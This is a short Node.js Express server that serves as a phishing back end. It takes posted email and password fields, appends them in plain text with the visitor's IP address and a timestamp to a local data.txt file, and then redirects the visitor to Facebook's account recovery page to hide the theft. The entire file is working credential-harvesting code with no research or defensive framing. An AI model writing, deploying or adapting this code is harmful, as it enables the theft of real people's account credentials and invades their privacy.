const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fs = require('fs');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/', (req, res) => {
    var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const data = req.body;
    const email = data.email;
    const password = data.pass;
    let options = {
        timeZone: 'Europe/Prague',
        year: 'numeric',
        month: 'numeric',
        day: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: false
    },
        formatter = new Intl.DateTimeFormat([], options);

    const currentTime = formatter.format(new Date()).toString();
    fs.appendFile('data.txt', `${currentTime}: \n - email: ${email} \n - password: ${password} \n - ip: ${ip} \n\n`, (err) => {
        if (err) throw err;
        console.log('Data saved successfully!');
    });
    res.status(200).redirect('https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0');
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});